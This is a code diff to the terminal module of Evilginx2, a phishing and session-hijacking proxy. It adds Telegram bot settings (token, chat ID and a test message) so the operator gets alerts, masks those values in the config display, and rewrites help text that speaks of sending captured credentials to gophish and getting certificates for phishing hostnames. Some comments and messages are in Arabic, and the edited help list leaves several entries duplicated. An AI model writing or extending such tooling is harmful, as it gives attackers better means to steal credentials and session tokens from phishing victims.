@@ -192,8 +192,13 @@ func (t *Terminal) handleConfig(args []string) error {
 			gophishInsecure = "true"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}
+		telegramEnabled := "off"
+		if t.cfg.GetTelegramBotToken() != "" && t.cfg.GetTelegramChatID() != "" {
+			telegramEnabled = "on"
+		}
+
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram enabled", "telegram bot_token", "telegram chat_id"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, telegramEnabled, maskValue(t.cfg.GetTelegramBotToken()), maskValue(t.cfg.GetTelegramChatID())}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -238,6 +243,23 @@ func (t *Terminal) handleConfig(args []string) error {
 				}
 				return nil
 			}
+		case "telegram":
+			switch args[1] {
+			case "test":
+				token := t.cfg.GetTelegramBotToken()
+				chatID := t.cfg.GetTelegramChatID()
+				if token == "" || chatID == "" {
+					return fmt.Errorf("telegram: bot token and chat ID must be configured first")
+				}
+				telegramBot := NewTelegramBot(token, chatID)
+				err := telegramBot.SendMessage("✅ إختبار اتصال الإشعارات من Evilginx2")
+				if err != nil {
+					log.Error("telegram: %s", err)
+				} else {
+					log.Success("telegram: تم إرسال رسالة الإختبار بنجاح")
+				}
+				return nil
+			}
 		}
 	} else if pn == 3 {
 		switch args[0] {
@@ -267,6 +289,15 @@ func (t *Terminal) handleConfig(args []string) error {
 					t.cfg.SetGoPhishInsecureTLS(false)
 					return nil
 				}
+			}
+		case "telegram":
+			switch args[1] {
+			case "bot_token":
+				t.cfg.SetTelegramBotToken(args[2])
+				return nil
+			case "chat_id":
+				t.cfg.SetTelegramChatID(args[2])
+				return nil
 			}
 		}
 	}
@@ -1160,9 +1191,11 @@ func (t *Terminal) monitorLurePause() {
 
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
+
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
+			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
+			readline.PcItem("telegram", readline.PcItem("bot_token"), readline.PcItem("chat_id"), readline.PcItem("test"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
@@ -1171,9 +1204,19 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
 	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
 	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
-	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
+	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ip_address>", "external IPv4 address of the current server")
+	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ip_address>", "external IPv4 address of the current server")
+	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ip_address>", "local IPv4 address to listen on")
+	h.AddSubCommand("config", []string{"https_port"}, "https_port <port>", "port to listen on for http/https requests")
+	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "URL to redirect unauthorized requests to")
+	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "automatically request Let's Encrypt SSL/TLS certificates for phishing hostnames")
+	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "gophish URL to which credentials are sent (this is your gophish admin server address)")
+	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "gophish API key")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
 	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
+	h.AddSubCommand("config", []string{"telegram", "bot_token"}, "telegram bot_token <token>", "set Telegram Bot API token")
+	h.AddSubCommand("config", []string{"telegram", "chat_id"}, "telegram chat_id <id>", "set Telegram chat ID to receive alerts")
+	h.AddSubCommand("config", []string{"telegram", "test"}, "telegram test", "test the telegram configuration")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
@@ -1798,4 +1841,15 @@ func (t *Terminal) filterInput(r rune) (rune, bool) {
 		return r, false
 	}
 	return r, true
+}
+
+// maskValue يخفي القيم الحساسة مثل رمز بوت تليجرام
+func maskValue(value string) string {
+	if value == "" {
+		return ""
+	}
+	if len(value) <= 8 {
+		return "****"
+	}
+	return value[0:4] + "****" + value[len(value)-4:]
 }
